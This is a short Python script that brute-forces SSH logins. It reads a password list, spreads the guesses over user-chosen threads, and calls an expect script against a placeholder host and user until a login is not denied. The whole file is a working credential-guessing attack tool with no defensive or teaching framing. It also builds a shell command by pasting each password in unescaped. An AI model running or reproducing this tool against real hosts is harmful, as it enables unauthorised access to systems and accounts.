from queue import Queue
import subprocess
import threading
import sys

th = input("Enter number of threads: ")

passwords = open('passwords.txt', 'r')

def ssh(password):
    command = './ssh.exp <host> <user> ' + password
    
    output = subprocess.getoutput(command)

    print('Command: ' + command)

    if(not 'denied' in output):
        print(output)
        
        global s_t
        s_t = True

def threader():
    while True:
        password = q.get()
        
        global s_t
        
        if(s_t):
            sys.exit()
            quit()
            break

        ssh(password)

        q.task_done()

q = Queue()

s_t = False

for x in range(int(th)):
     t = threading.Thread(target=threader)
     t.daemon = True

     t.start()

for password in passwords:
    q.put(password)

q.join()

